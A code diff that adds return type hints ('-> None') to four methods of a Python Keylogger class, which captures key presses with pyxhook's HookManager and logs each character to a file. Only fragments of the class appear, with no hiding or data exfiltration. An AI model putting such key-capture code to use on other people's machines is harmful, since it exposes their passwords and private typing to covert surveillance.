@@ -7,7 +7,7 @@ class Keylogger:
     Logs key events to a file
     """
 
-    def __init__(self, filename: str):
+    def __init__(self, filename: str) -> None:
         """
         Constructor
         
@@ -20,7 +20,7 @@ class Keylogger:
         self.manager = pyxhook.HookManager()
 
 
-    def log(self):
+    def log(self) -> None:
         """ 
         Start logging key presses
         """
@@ -33,7 +33,7 @@ class Keylogger:
         self.manager.start()
         
         
-    def kill(self):
+    def kill(self) -> None:
         """
         Stops logging key events
         """
@@ -52,7 +52,7 @@ class Keylogger:
         logging.debug(chr(key.Ascii))
 
 
-    def setup(self):
+    def setup(self) -> None:
         """
         Sets up the logging config
         """
